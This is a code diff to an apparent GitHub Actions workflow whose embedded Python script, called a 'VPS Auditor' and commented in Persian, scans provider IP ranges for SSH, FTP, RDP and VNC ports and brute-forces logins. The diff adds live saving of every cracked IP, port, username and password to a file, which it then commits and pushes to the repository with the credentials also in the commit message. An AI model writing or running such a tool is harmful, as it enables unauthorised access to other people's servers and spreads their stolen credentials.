@@ -97,6 +97,20 @@ jobs:
           DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
           SCAN_PORTS = [int(p.strip()) for p in os.environ.get("SCAN_PORTS", "22,21,3389,5900,8080,443").split(',')]
 
+          CRED_FILE = "found_credentials.txt"
+          if not os.path.exists(CRED_FILE):
+              with open(CRED_FILE, "w") as f:
+                  f.write(f"# VPS Auditor - Found Credentials\n")
+                  f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                  f.write("# Format: IP:PORT | SERVICE | USERNAME | PASSWORD\n")
+                  f.write("="*60 + "\n")
+
+          def save_credential(ip, port, service, username, password):
+              timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+              with open(CRED_FILE, "a") as f:
+                  f.write(f"[{timestamp}] {ip}:{port} | {service} | {username} | {password}\n")
+              os.system(f"git add {CRED_FILE} && git commit -m 'Found: {ip}:{port} {username}:{password}' && git push 2>/dev/null || true")
+
           # ===== ۱. IP Discovery =====
           targets = []
 
@@ -260,8 +274,9 @@ jobs:
               usernames = [x.strip() for x in usernames_input.split(',') if x.strip()] if usernames_input else ["root"]
               passwords = [x.strip() for x in passwords_input.split(',') if x.strip()] if passwords_input else ["123456"]
 
-          # ===== ۴. تست چندپروتکلی =====
+          # ===== ۴. تست چندپروتکلی با ذخیره زنده =====
           results = []
+          successes = []
           total_combos = sum(1 for ip, ports in port_results.items() 
                             for port, is_open in ports.items() if is_open) * len(usernames) * len(passwords)
           attempt = 0
@@ -301,18 +316,20 @@ jobs:
                           
                           if success:
                               console.print(f"\n[green]✅ موفق: {ip}:{port} ({service}) {username}:{password}[/green]")
-                              results.append({
+                              result = {
                                   "ip": ip, "port": port, "service": service,
                                   "username": username, "password": password, "status": "SUCCESS"
-                              })
+                              }
+                              results.append(result)
+                              successes.append(result)
+                              save_credential(ip, port, service, username, password)
                           else:
                               results.append({
                                   "ip": ip, "port": port, "service": service,
                                   "username": username, "password": password, "status": "FAILED"
                               })
 
-          # ===== ۵. گزارش =====
-          successes = [r for r in results if r["status"] == "SUCCESS"]
+          # ===== ۵. گزارش نهایی =====
           if successes:
               tbl = Table(title="✅ Successful Credentials", show_header=True, header_style="bold white")
               tbl.add_column("IP", style="cyan")
@@ -323,6 +340,7 @@ jobs:
               for r in successes:
                   tbl.add_row(r["ip"], str(r["port"]), r["service"], r["username"], r["password"])
               console.print(tbl)
+              console.print(f"\n[green]📄 {len(successes)} اعتبارنامه موفق در {CRED_FILE} ذخیره شد[/green]")
           else:
               console.print("[red]❌ هیچ اعتبارنامه موفقی پیدا نشد.[/red]")
 
@@ -338,5 +356,5 @@ jobs:
                   for r in successes:
                       f.write(f"{r['ip']}:{r['port']} ({r['service']}) - {r['username']}:{r['password']}\n")
           os.system(f"git add {report} && git commit -m 'Multi-port VPS audit' && git push 2>/dev/null || true")
-          console.print(f"\n[green]📄 گزارش: {report}[/green]")
+          console.print(f"\n[green]📄 گزارش کامل: {report}[/green]")
           PYEOF
